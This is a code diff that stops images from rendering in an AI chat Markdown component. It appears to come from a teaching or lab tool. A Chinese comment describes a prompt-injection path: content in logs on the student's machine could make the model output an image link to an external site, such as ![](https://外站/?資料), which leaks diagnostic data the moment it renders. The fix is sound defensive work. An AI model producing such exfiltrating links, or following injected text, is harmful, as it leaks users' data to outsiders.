@@ -152,13 +152,16 @@ export function AiPveToolHistory({ tools, t }) {
 }
 
 /** 將 AI 回覆以安全的 Markdown 呈現，避免格式標記以原始文字顯示。
- *  表格內的狀態標記、分層標籤與百分比再轉成徽章／晶片／量表，見 aiPveRichText。 */
+ *  表格內的狀態標記、分層標籤與百分比再轉成徽章／晶片／量表，見 aiPveRichText。
+ *  圖片一律不顯示：模型讀得到學生機器內的服務與日誌（prompt injection），
+ *  ![](https://外站/?資料) 一渲染瀏覽器就會自己送出請求，把診斷內容帶出去（同 AiFloatingChat 的 MarkdownContent）。 */
 export function AiPveMarkdownContent({ content }) {
   return (
     <div className={`${styles.msgContent} ${styles.msgMarkdown}`}>
       <ReactMarkdown
         remarkPlugins={[remarkGfm]}
         rehypePlugins={[rehypeSanitize]}
+        disallowedElements={["img"]}
         components={AI_PVE_MARKDOWN_COMPONENTS}
       >
         {sanitizeAiPveContent(content)}
